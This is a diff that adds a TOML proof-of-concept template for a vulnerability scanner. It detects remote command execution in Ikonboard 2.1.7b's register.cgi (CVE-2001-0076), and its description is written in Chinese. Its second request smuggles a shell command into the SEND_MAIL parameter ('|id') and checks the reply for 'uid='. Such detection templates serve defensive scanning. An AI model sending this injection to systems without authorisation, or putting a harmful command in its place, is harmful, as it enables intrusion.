@@ -1,0 +1,50 @@
+[info]
+author = "ave"
+description = "Ikonboard 2.1.7b 及更早版本中 register.cgi 未正确过滤 SEND_MAIL 参数，攻击者可通过 HTTP GET 请求向该参数传递管道符和系统命令，覆盖程序内部用于引用可执行程序的变量，导致远程命令执行。验证方式：发送包含 SEND_MAIL=|id 的请求，检测响应中是否包含 uid= 字符串。"
+id = "POC-AVE-2001-0706"
+name = "Ikonboard register.cgi 远程命令执行漏洞 PoC"
+severity = "critical"
+tags = ["ave-2001-0706"]
+vuln_id = [
+    "CVE-2001-0076",
+    "AVE-2001-0706",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/register.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/register.cgi?SEND_MAIL=|id"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
